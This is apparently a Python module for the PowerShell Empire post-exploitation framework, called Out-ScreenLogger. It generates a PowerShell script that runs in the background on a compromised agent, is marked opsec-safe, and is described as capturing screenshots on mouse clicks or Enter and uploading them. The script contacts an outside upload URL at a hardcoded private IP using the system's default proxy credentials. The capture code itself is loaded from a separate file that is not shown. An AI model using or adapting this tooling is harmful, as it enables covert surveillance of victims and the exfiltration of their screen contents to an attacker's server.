from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Out-ScreenLogger',

            'Author': ['@hillar'],

            'Description': ('Takes and uploads screenshots on mouseclikc or enter key'),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',

            'Comments': [
                'https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/collection/screenshot.py',
                'https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/collection/keylogger.py'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   'kala'
            },
            'SavePath' : {
                'Description'   :   'Specifies the directory name for saved screenshots.',
                'Required'      :   True,
                'Value'         :   'c:\Windows\Temp'

            },
            'Url' : {
                'Description'   :   'Specifies the URL for which a upload will be done.',
                'Required'      :   True,
                'Value'         :   'http://192.168.33.22/upload.php'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Out-ScreenStrokes.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = script = """
function Get-Screenshot
{

    [CmdletBinding()]
    Param (

        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $SavePath,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Agent,

        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $Url


    )
    if (Test-Path $SavePath) {
        [String] $url = "$Url`?agent=$Agent"
        $wc = new-object system.net.WebClient
        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
        try{
            $response = $wc.DownloadData($url);
        }
        catch [System.Net.WebException]{
            "ERROR $Url failed"
            exit
        }
        finally {
            $wc.Dispose()
        }

        "starting screenlogger on $Agent uploading to $Url (if failed save to $SavePath)"

    }
    else {
        "ERROR $SavePath does not exist"
    }

}
Get-Screenshot"""

        for option,values in self.options.iteritems():
            if values['Value'] and values['Value'] != '':
                #if option != "Agent" :
                    script += " -" + str(option) + " " + str(values['Value'])


        return script
